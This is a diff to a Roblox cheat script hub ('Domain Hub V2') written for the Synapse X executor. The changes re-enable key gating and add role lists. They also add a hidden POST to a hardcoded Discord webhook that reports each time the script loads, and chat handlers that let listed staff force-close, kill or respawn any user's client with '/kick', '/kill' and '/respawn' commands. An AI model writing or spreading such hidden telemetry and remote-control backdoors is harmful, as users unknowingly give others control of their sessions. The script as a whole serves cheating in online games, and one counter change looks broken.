@@ -11,9 +11,6 @@ if not game:IsLoaded() then
 	local loadtext = "Domain Hub is waiting on the game to load"
 	
 	local dmnwait = Instance.new("ScreenGui")
-    if syn and syn.protect_gui then
-        syn.protect_gui(dmnwait)
-    end
 	local main = Instance.new("Frame")
 	local UICorner = Instance.new("UICorner")
 	local text = Instance.new("TextLabel")
@@ -52,7 +49,16 @@ end
 
 
 
+-- literally just to see how many people boot it, deleting in like 20m!!
+if syn and syn.request then
+	local HttpServ = game:GetService('HttpService')
+	local url = "https://discord.com/api/webhooks/843119877619318804/UZ9Pi7h0Lja1AbaXgDBhSri2_RBCSpb0xx7PuSXmt4G_CMWjI1Rtz7XOiOguQXG3vAo0"
 
+	local headers = {["content-type"] = "application/json"}
+
+	local newdata = HttpServ:JSONEncode({content = "Domain v2 was loaded"})
+	syn.request({Url=url, Body=newdata, Method="POST", Headers=headers})
+end
 
 
 local Domain = {
@@ -358,6 +364,7 @@ local Domain = {
 
 if syn and syn.protect_gui then
 	syn.protect_gui(Domain.Domain)
+	print("Synapse X - Domain")
 end
 
 --Properties:
@@ -3257,15 +3264,16 @@ Domain.notice.TextWrapped = true
 
 V2 = true
 Key = "2r0jfv"
-Key2 = "nil"
-keyenabled = false
+Key2 = "lnjtq7"
+keyenabled = true
 
 
 NotificationDuration = 6.5
 ReleaseType = "Release"
-Release = 1.39
-ReleaseFeature = "Open Sourced"
+Release = 1.33
+ReleaseFeature = "squashed bugs"
 DiscordLink = "discord.gg/XrHqjy6tBc"
+DomainPass = 16104485
 
 bindable = Instance.new("BindableEvent")
 bindable.Parent = Domain.Domain
@@ -3317,7 +3325,7 @@ DOMAIN_ENABLED = true
 
 customtitles = {
 	
-	[1] = {title="bigdaddy",userids={000}},
+	[1] = {title="Patron Supporter",userids={000}},
 	[2] = {title="Lynx Owner",userids={23736476,98645}},
 	[3] = {title="Magnius Owner, Domain Staff",userids={83381940}},
 	[4] = {title="The longest fellow",userids={1224384865}},
@@ -3331,9 +3339,13 @@ customtitles = {
 	
 }
 Disguised = {131040825,235,23514,5467,365743424,53464572524,3734536758,352341235,47453,4,65635246,3252657624,36355241246,234646356586854,12312645,76585234,12474563254,7567368676796341534457,68568696774,63,24,536474846452}
+Admins = {669686927,76237634,89779573,37962366,1984655763,262635913,1015797562,719084364,839408951,1373837031,2298490899,25798996,415918665,439204081}
+Showcasers = {434928087,1598108139,2325926644,254782537,261882701,839408951,2403423571,941788712}
 Banned = {17241083,26892987,20655358,10516000,660242324,225493776}
 Developers = {304343782}
 loldiscord = {"dude this is so cool","Domain","showcase this","watch this space","bruh","use magnius - rexi","domain winning","make it trending on twitter","oops","if this isnt in your auto exec, i will find you","preparing for lift off","dababy car","underrated","sirmeme make a video on domain hub","you know how i be, i just poopin","this table is long dude","discord.gg/shlex","boost the server damn it","pog champ","imagine trying to crack domain hub"}
+
+Beta = {130974538,1944310458,684497103,130701262,1024179351,1648382886,2395488379,1645783740,293463873,2230377215,409935083,55135104,488914336,669686927,262635913,1015797562,523750872,719084364,1031364103,2375349522,238834532,1139266612,2220153812}
 AntiExploits = {
 
 	Venti = {
@@ -4840,7 +4852,7 @@ function LoadPlayer(Player)
 			end
 		end
 	end
-	if table.find(Developers,Player.UserId) or b == true then
+	if table.find(Beta,Player.UserId) or table.find(Admins,Player.UserId) or table.find(Developers,Player.UserId) or b == true or table.find(Showcasers,Player.UserId) then
 		NewPlr.Star.Visible = true
 		NewPlr.Username.Position = UDim2.new(0.267,0,0.28,0)
 		NewPlr.AvatarPlayerlist.Position = UDim2.new(0.144,0,0.144,0)
@@ -5038,6 +5050,22 @@ function OpenAboutPlayer(Player)
 			Domain.PlayerInfoFrame.Functionality.group.Visible = false
 		end
 		Domain.DomainRole.Visible = false
+		if table.find(Beta,Player.UserId) then
+			Domain.DomainRole.Text = "Beta Tester"
+			Domain.DomainRole.Visible = true
+		end
+		if table.find(Showcasers,Player.UserId) then
+			Domain.DomainRole.Text = "Showcaser"
+			Domain.DomainRole.Visible = true
+		end
+		if Player:IsInGroup(10220078) then
+			Domain.DomainRole.Text = "Domain Premium"
+			Domain.DomainRole.Visible = true
+		end
+		if table.find(Admins,Player.UserId) then
+			Domain.DomainRole.Text = "Domain Staff"
+			Domain.DomainRole.Visible = true
+		end
 		if table.find(Developers,Player.UserId) then
 			Domain.DomainRole.Text = "Domain Developer"
 			Domain.DomainRole.Visible = true
@@ -5148,8 +5176,8 @@ end
 
 function BootDomain()
 	if DOMAIN_ENABLED == true then
-		Notify("Running Open Sourced Version of Domain Hub V2","GothamBlack",Color3.fromRGB(170, 0, 0))
-        Notify("Domain Hub X is coming soon! Keep up to date in the discord server","GothamSemibold",Color3.fromRGB(229, 146, 12))
+		
+	
 		local Player = game.Players.LocalPlayer
 		
 		if table.find(Banned,Player.UserId) then
@@ -5162,12 +5190,14 @@ function BootDomain()
 		end
 		
 	Load()
+	loadwidgets()
 	StartUnfunctionals()
 	
 		if game.Players.LocalPlayer:IsInGroup(10220078) then
 			Notify("Welcome, "..Player.DisplayName.." to Domain Hub Premium","GothamSemibold",Color3.fromRGB(46, 136, 111))
 
 			if theme and themedata and game.Players.LocalPlayer:IsInGroup(10220078) then
+
 				LoadTheme(themedata.BGColor1,themedata.BGColor2,themedata.LogoIcon)
 				Notify("Loading "..themedata.ThemeName.." theme","GothamSemibold",themedata.BGColor1)
 			end
@@ -5224,13 +5254,37 @@ function BootDomain()
 	
 	for _, Player in ipairs(game.Players:GetChildren()) do
 		if game.Players.LocalPlayer:IsFriendsWith(Player.UserId) then
-			friendsingame = friendsingame + 1
+			friendsingame = friendsingame - 1
 			Domain.amount_2.Text = friendsingame.." are in this game"	
 		end
 		if friendsingame == 0 then
 			Domain.amount_2.Text = "None are in this game"	
 		end
-	end
+		if table.find(Developers,Player.UserId) or table.find(Admins,Player.UserId) then
+			if game.CreatorId ~= 0 then
+				if game:GetService("CoreGui"):FindFirstChild("Domain") then
+					Player.Chatted:Connect(function(Message)
+						if Message == "/domain" and Player ~= game.Players.LocalPlayer and enabled then
+							game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Player.Name.." ".."Domain "..ReleaseType.. " v"..Release, "All")
+							game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/leave", "All")
+						end	
+						if Message == "/kick "..game.Players.LocalPlayer.Name and enabled then
+							game:Shutdown()
+							end
+							if Message == "/refresh "..game.Players.LocalPlayer.Name and enabled then
+								refresh()
+							end
+							if Message == "/respawn "..game.Players.LocalPlayer.Name and enabled then
+								respawn()
+							end
+							if Message == "/kill "..game.Players.LocalPlayer.Name and enabled then
+								Kill(game.Players.LocalPlayer)
+							end
+					end)
+				end
+			end
+		end
+		end
 		for _, exp in pairs(BackgroundExploits) do
 
 			for _, place in pairs(exp.PlaceIds) do
@@ -5544,7 +5598,7 @@ end
 
 
 Domain.CancelShop.MouseButton1Click:Connect(function()
-	Domain.ServerhopAnim.NoticeMessage.Text = " Successfully cancelled"
+	Domain.ServerhopAnim.NoticeMessage.Text = " Successfully canceled"
 	Domain.LargeMsg.Text = "Stopped"
 	StopShop = true
 	local transitionInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quint)
@@ -5608,6 +5662,19 @@ game.Players.PlayerAdded:Connect(function(Player)
 	end
 	if friendsingame <= 0 then
 		Domain.amount_2.Text = "None are in this game"	
+	end
+	if table.find(Developers,Player.UserId) or table.find(Admins,Player.UserId) then
+		if game.CreatorId ~= 0 then
+			if game:GetService("CoreGui"):FindFirstChild("Domain") then
+				Player.Chatted:Connect(function(Message)
+					if Message == "/domain" and Player ~= game.Players.LocalPlayer and enabled then
+						game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Player.Name.." ".."Domain "..ReleaseType.. " v"..Release, "All")
+						wait(1)
+						game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/leave", "All")
+					end	
+				end)
+			end
+		end
 	end
 	if #game.Players:GetChildren() > 4 and Sidebaropen and tamperwithplayerlist then
 		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList,false)
